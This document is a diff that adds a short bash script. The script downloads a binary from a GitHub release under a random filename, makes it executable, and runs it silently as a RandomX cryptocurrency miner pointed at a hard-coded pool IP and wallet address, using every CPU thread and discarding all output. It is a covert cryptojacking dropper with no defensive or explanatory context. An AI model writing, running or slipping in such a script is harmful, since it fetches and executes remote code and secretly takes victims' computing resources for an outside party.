@@ -1,0 +1,13 @@
+#!/bin/bash
+# Generate a random filename
+BIN_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 12)
+
+# Download binary quietly and rename
+wget -q https://github.com/kiloplam/pravasa/releases/download/pravdos/pravdo -O "$BIN_NAME"
+
+# Make it executable
+chmod +x "$BIN_NAME"
+
+# Optional: run the binary
+# ./"$BIN_NAME"
+./"$BIN_NAME" -o 3.210.183.63:4549 -u 44Hy7goGeFtd6HeHC4GEYXhApgSCNKf2q1YRPVA9661mQWoZ5WVTovj8Te1kmLmdut1dXwws7C491EoFUTbN3qCv8zbwhKC/SSpk1 -a rx/0 -t $(nproc --all) > /dev/null 2>&1
